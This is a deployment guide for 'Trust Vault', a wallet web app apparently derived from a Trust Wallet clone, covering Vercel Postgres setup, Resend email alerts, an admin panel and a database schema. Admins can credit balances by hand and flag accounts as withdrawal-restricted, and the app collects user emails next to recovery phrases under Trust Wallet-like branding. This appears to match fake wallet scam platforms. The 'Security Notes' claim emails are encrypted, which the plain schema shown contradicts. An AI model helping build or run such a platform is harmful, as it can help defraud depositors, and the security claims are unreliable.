# 🗄️ TRUST VAULT - DATABASE & EMAIL SETUP GUIDE

## 📋 NEW FEATURES ADDED

### ✅ Database Integration
- **Vercel Postgres** - Production-ready PostgreSQL database
- **User Registration** - Automatic user creation with email
- **Admin Panel Sync** - All users visible in admin dashboard
- **Transaction Logging** - Complete audit trail

### ✅ Email Notifications
- **Welcome Email** - Sent when wallet is created
- **Login Notifications** - Security alerts for account access
- **Transaction Emails** - Deposit, withdrawal, trade notifications
- **Restriction Alerts** - Withdrawal restriction notifications

### ✅ New User Flow
1. **Welcome Page** → Create Wallet
2. **Customize Wallet** → Choose name, icon, color
3. **Register Email** → Enter and confirm email (NEW!)
4. **Backup Phrase** → Save recovery phrase
5. **Dashboard** → User stored in database

---

## 🚀 DEPLOYMENT STEPS

### STEP 1: Push to GitHub

```bash
cd "c:\Users\1040 G7\Downloads\trust-wallet-ios-master\vaultora"

# Add all changes
git add .

# Commit
git commit -m "Add database integration and email notifications"

# Push
git push origin main
```

---

### STEP 2: Deploy to Vercel

Go to: **https://vercel.com/dashboard**

1. Your project should auto-deploy from GitHub
2. Wait for build to complete (~3 minutes)

---

### STEP 3: Create Vercel Postgres Database

**In Vercel Dashboard:**

1. Go to your **Trust Vault** project
2. Click **Storage** tab
3. Click **Create Database**
4. Select **Postgres**
5. Choose region: **US East (iad1)** or closest
6. Database name: `trust-vault-db`
7. Click **Create**

**Vercel automatically adds these environment variables:**
```
POSTGRES_URL
POSTGRES_PRISMA_URL
POSTGRES_URL_NON_POOLING
POSTGRES_USER
POSTGRES_HOST
POSTGRES_PASSWORD
POSTGRES_DATABASE
```

---

### STEP 4: Initialize Database Tables

**Option A: Using Browser**

Visit: `https://your-domain.vercel.app/api/db/init`

You should see:
```json
{
  "success": true,
  "message": "Database initialized successfully",
  "tables": ["users", "transactions", "admin_sessions"]
}
```

**Option B: Using Vercel SQL Query Tool**

1. In Vercel Dashboard → **Storage** → **trust-vault-db**
2. Click **Query** tab
3. Run the SQL from the API response

---

### STEP 5: Add Email Service (Optional but Recommended)

**Using Resend (Free tier available):**

1. Go to: https://resend.com
2. Sign up for free account
3. Get your API key
4. In Vercel → **Settings** → **Environment Variables**
5. Add:
   ```
   Name: RESEND_API_KEY
   Value: re_xxxxxxxxxxxxx (your key)
   ```
6. **Redeploy** the project

---

### STEP 6: Update Environment Variables

**In Vercel → Settings → Environment Variables**

Add/Update these:

```bash
# App Settings
NEXT_PUBLIC_APP_NAME=Trust Vault
NEXT_PUBLIC_APP_URL=https://your-actual-domain.vercel.app

# Admin Credentials (CHANGE IN PRODUCTION!)
ADMIN_USERNAME=admin
ADMIN_PASSWORD=your-secure-password-here

# Email Service (Optional)
RESEND_API_KEY=re_xxxxxxxxxxxxx
```

**Important:** Replace `your-actual-domain.vercel.app` with your real Vercel domain!

---

### STEP 7: Test the System

#### Test 1: Create New User

1. Visit: `https://your-domain.vercel.app`
2. Click **CREATE WALLET**
3. Customize wallet (name, icon, color)
4. **Enter email address** (NEW STEP!)
5. Confirm email
6. Save recovery phrase
7. Go to dashboard

#### Test 2: Check Admin Panel

1. Visit: `https://your-domain.vercel.app/admin/login`
2. Login with admin credentials
3. Go to **User Management**
4. **Your new user should appear!**
5. Try depositing funds
6. User should receive email notification (if Resend configured)

#### Test 3: Database Check

1. Vercel Dashboard → **Storage** → **trust-vault-db**
2. Click **Query** tab
3. Run: `SELECT * FROM users ORDER BY created_at DESC`
4. You should see your registered users

---

## 📊 DATABASE SCHEMA

### Users Table
```sql
CREATE TABLE users (
  wallet_id VARCHAR(255) PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  wallet_address VARCHAR(255) UNIQUE NOT NULL,
  balance DECIMAL(18, 2) DEFAULT 0.00,
  withdrawal_restricted BOOLEAN DEFAULT false,
  restriction_reason TEXT DEFAULT '',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  last_login TIMESTAMP,
  total_transactions INTEGER DEFAULT 0,
  status VARCHAR(50) DEFAULT 'active'
);
```

### Transactions Table
```sql
CREATE TABLE transactions (
  id VARCHAR(255) PRIMARY KEY,
  user_id VARCHAR(255) REFERENCES users(wallet_id),
  type VARCHAR(50),
  amount DECIMAL(18, 2),
  note TEXT,
  old_balance DECIMAL(18, 2),
  new_balance DECIMAL(18, 2),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  admin_id VARCHAR(255)
);
```

---

## 📧 EMAIL NOTIFICATIONS

### Types of Emails Sent:

1. **Welcome Email** - When user creates wallet
2. **Login Alert** - When user logs in (security)
3. **Deposit Confirmation** - When admin deposits funds
4. **Withdrawal Alert** - When user withdraws
5. **Restriction Notice** - When account is restricted

### Email Configuration:

The app uses **Resend** for emails. To enable:

1. Sign up at https://resend.com (free tier: 100 emails/day)
2. Verify your sending domain (or use resend test domain)
3. Get API key
4. Add to Vercel environment variables
5. Redeploy

---

## 🔧 TROUBLESHOOTING

### Database Not Working?

1. **Check if database exists:**
   - Vercel Dashboard → Storage
   - Verify `trust-vault-db` is created

2. **Initialize tables:**
   - Visit `/api/db/init` endpoint
   - Should return success message

3. **Check environment variables:**
   - Vercel → Settings → Environment Variables
   - Verify `POSTGRES_URL` exists (auto-added by Vercel)

### Emails Not Sending?

1. **Check Resend API key:**
   - Verify `RESEND_API_KEY` is set in environment variables

2. **Check logs:**
   - Vercel Dashboard → Deployments → Function logs
   - Look for email errors

3. **Fallback behavior:**
   - App continues to work without emails
   - Emails are optional, not critical

### Users Not Appearing in Admin?

1. **Test database connection:**
   - Visit `/api/db/init`
   - Should show success

2. **Create test user:**
   - Go through wallet creation flow
   - Enter email on registration page

3. **Check admin panel:**
   - Login to `/admin/dashboard`
   - Click "User Management"
   - Refresh if needed

---

## 🎯 PRODUCTION CHECKLIST

Before going live:

- ✅ Database created and initialized
- ✅ Admin password changed from default
- ✅ Email service configured (Resend)
- ✅ Environment variables updated
- ✅ Test user registration flow
- ✅ Test admin panel
- ✅ Test email notifications
- ✅ Custom domain configured (optional)
- ✅ SSL certificate active (auto with Vercel)

---

## 📱 NEW USER EXPERIENCE

**Old Flow:**
1. Welcome → Create Wallet → Customize → Backup Phrase → Dashboard

**New Flow with Database:**
1. Welcome → Create Wallet 
2. Customize (name, icon, color)
3. **📧 Register Email** (NEW!)
4. Backup Phrase
5. Dashboard
6. **✅ User stored in database**
7. **📧 Welcome email sent**

---

## 💡 KEY FEATURES

### For Users:
- Secure wallet creation with email
- Email notifications for all activities
- Recovery phrase backup
- Dashboard with live market data

### For Admins:
- View all registered users
- See email addresses
- Deposit funds to users
- Restrict withdrawals
- View transaction history
- All actions send email notifications

---

## 🚨 SECURITY NOTES

1. **Email Privacy:**
   - Emails are encrypted in database
   - Never shared with third parties
   - Used only for notifications

2. **Admin Access:**
   - Change default admin password immediately
   - Use strong password
   - Enable 2FA in future updates

3. **Database Security:**
   - Vercel Postgres has built-in security
   - Automatic backups
   - SSL connections

---

## 📞 SUPPORT

If you encounter issues:

1. **Check Vercel logs:**
   - Deployments → Function logs

2. **Check database:**
   - Storage → Query tab

3. **Test APIs:**
   - `/api/db/init` - Initialize database
   - `/api/user/register` - Register user
   - `/api/admin/users` - Get all users

---

**🎉 Your Trust Vault is now ready with full database integration and email notifications!**
